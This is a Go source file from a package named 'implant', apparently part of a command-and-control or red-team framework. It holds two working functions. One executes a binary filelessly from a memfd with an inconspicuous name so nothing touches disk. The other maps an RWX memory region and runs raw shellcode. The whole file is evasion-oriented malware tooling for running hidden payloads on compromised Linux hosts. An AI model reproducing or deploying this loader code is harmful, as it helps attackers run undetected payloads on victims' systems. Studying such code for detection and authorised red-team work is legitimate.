//go:build linux

package implant

import (
	"bytes"
	"fmt"
	"os/exec"
	"syscall"
	"unsafe"
)

// executeBOFLinux executes a shared object entirely from memory using memfd_create.
// No file is written to disk — the binary exists only as an anonymous file descriptor.
//
// Flow:
// 1. memfd_create() — creates anonymous memory-backed file descriptor
// 2. Write ELF/SO bytes to the fd
// 3. fexecve() or /proc/self/fd/N exec — runs from the memory fd
// 4. Capture stdout/stderr
// 5. fd is automatically cleaned up when process exits
func executeBOFLinux(bofData []byte, args []byte) ([]byte, error) {
	// Create anonymous memory-backed file descriptor
	// memfd_create(name, flags) — SYS_MEMFD_CREATE = 319 on x86_64
	nameBytes := []byte("  \x00") // Minimal name (appears as "  " in /proc/pid/fd)

	fd, _, errno := syscall.RawSyscall(
		319, // SYS_MEMFD_CREATE
		uintptr(unsafe.Pointer(&nameBytes[0])),
		0, // MFD_CLOEXEC = 1, but we use 0 so child can access
		0,
	)
	if errno != 0 {
		return nil, fmt.Errorf("memfd_create failed: %v", errno)
	}
	defer syscall.Close(int(fd))

	// Write the ELF/binary data to the memory fd
	_, err := syscall.Write(int(fd), bofData)
	if err != nil {
		return nil, fmt.Errorf("write to memfd: %w", err)
	}

	// Execute from /proc/self/fd/N — this never touches the filesystem
	fdPath := fmt.Sprintf("/proc/self/fd/%d", fd)

	// Build command with optional args
	cmdArgs := []string{fdPath}
	if len(args) > 0 {
		// Pass args as string arguments
		cmdArgs = append(cmdArgs, string(args))
	}

	cmd := exec.Command(fdPath)
	cmd.Args = cmdArgs

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	err = cmd.Run()

	output := stdout.Bytes()
	if stderr.Len() > 0 {
		if len(output) > 0 {
			output = append(output, '\n')
		}
		output = append(output, stderr.Bytes()...)
	}

	if err != nil && len(output) == 0 {
		return []byte(fmt.Sprintf("memfd execution error: %v", err)), err
	}

	return output, nil
}

// ExecuteShellcodeLinux executes raw shellcode in memory via mmap + function call.
// The shellcode runs in the current process context.
func ExecuteShellcodeLinux(shellcode []byte) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("empty shellcode")
	}

	// mmap anonymous RWX region
	mem, _, errno := syscall.RawSyscall6(
		syscall.SYS_MMAP,
		0,
		uintptr(len(shellcode)),
		syscall.PROT_READ|syscall.PROT_WRITE|syscall.PROT_EXEC,
		syscall.MAP_PRIVATE|syscall.MAP_ANONYMOUS,
		0,
		0,
	)
	if errno != 0 {
		return fmt.Errorf("mmap failed: %v", errno)
	}

	// Copy shellcode to mapped memory
	//nolint:govet // Intentional unsafe pointer for shellcode execution
	dst := unsafe.Slice((*byte)(unsafe.Pointer(mem)), len(shellcode)) //nolint:unsafeptr
	copy(dst, shellcode)

	// Cast to function pointer and call
	// This is intentionally unsafe — executing shellcode requires it
	type shellcodeFunc func()
	funcPtr := mem
	fn := *(*shellcodeFunc)(unsafe.Pointer(&funcPtr))
	fn()

	// Unmap (only reached if shellcode returns)
	syscall.Syscall(syscall.SYS_MUNMAP, mem, uintptr(len(shellcode)), 0)

	return nil
}
